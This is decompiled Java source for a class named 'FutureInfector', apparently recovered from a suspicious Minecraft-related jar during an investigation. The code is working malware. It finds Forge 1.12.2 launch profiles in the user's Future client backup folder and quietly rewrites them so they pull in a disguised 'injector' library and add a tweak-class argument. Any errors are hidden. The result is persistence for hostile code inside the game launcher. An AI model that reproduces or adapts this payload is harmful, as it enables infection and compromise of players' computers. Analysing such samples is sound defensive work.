/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import com.google.gson.JsonArray;
/*    */ import com.google.gson.JsonElement;
/*    */ import com.google.gson.JsonObject;
/*    */ import com.google.gson.JsonParser;
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import java.io.File;
/*    */ import java.nio.charset.StandardCharsets;
/*    */ import java.nio.file.Files;
/*    */ import java.nio.file.Paths;
/*    */ import java.util.Objects;
/*    */ 
/*    */ 
/*    */ public final class FutureInfector
/*    */   implements Payload
/*    */ {
/*    */   public void execute() throws Exception {
/*    */     try {
/* 20 */       File file = new File(System.getProperty("user.home") + "\\Future\\backup");
/* 21 */       if (file.isDirectory())
/*    */       {
/* 23 */         for (File f : (File[])Objects.<File[]>requireNonNull(file.listFiles())) {
/*    */           
/* 25 */           if (f.getName().contains("1.12.2") && f.getName().contains("forge")) {
/*    */             
/* 27 */             String json = new String(Files.readAllBytes(Paths.get(f.getAbsolutePath(), new String[0])), StandardCharsets.UTF_8);
/* 28 */             if (!json.contains("--tweakClass net.minecraftforge.modloader.Tweaker"))
/*    */             {
/* 30 */               JsonObject thing = (new JsonParser()).parse(json).getAsJsonObject();
/* 31 */               JsonArray array = thing.getAsJsonArray("libraries");
/* 32 */               JsonObject object = new JsonObject();
/* 33 */               object.addProperty("name", "net.minecraftforge:injector:forgedefault");
/* 34 */               array.add((JsonElement)object);
/* 35 */               String args = thing.get("minecraftArguments").getAsString();
/* 36 */               thing.remove("minecraftArguments");
/* 37 */               thing.addProperty("minecraftArguments", args + " --tweakClass net.minecraftforge.modloader.Tweaker");
/* 38 */               Files.write(Paths.get(f.getAbsolutePath(), new String[0]), thing.toString().getBytes(StandardCharsets.UTF_8), new java.nio.file.OpenOption[0]);
/*    */             }
/*    */           
/*    */           } 
/*    */         } 
/*    */       }
/* 44 */     } catch (Exception exception) {}
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\FutureInfector.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */